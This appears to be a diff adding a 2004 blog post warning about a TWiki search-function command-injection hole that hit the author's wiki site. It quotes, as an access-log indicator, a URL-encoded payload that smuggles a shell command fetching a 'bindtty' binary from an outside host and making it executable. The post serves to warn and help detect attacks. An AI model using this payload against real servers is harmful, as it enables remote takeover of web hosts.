@@ -1,0 +1,16 @@
+[%- META
+      menu_choice = 'blog'
+      page_title  = 'Security warning with TWiki' %]
+<p class="post-footer align-right">
+  <span class="date">November 15, 2004</span>
+</p>
+<h1>Security warning with TWiki</h1>
+
+<a href="http://www.securitytracker.com/alerts/2004/Nov/1012223.html">TWiki Input Validation Hole in Search Function Lets Remote Users Execute Shell Commands</a> - This one got me at the OpenInteract wiki site. How do you know you've been bit? Check your access log for a GET URL like:
+<pre class="smallSourceCode">
+search/TWiki/?search=doesnotexist1%27%3B+%28wget+http%3A%2F%2Fblank.exitnic.net%2Fbindtty%3B+chmod+777+bindtty...
+</pre>
+<p>As long as your web server is running as an unprivileged user (like <tt>apache</tt>) you shouldn't be up the creek. It's still goddamned annoying these little bastards make simple things a chore...</p>
+ 
+
+<!-- Tags: programming -->
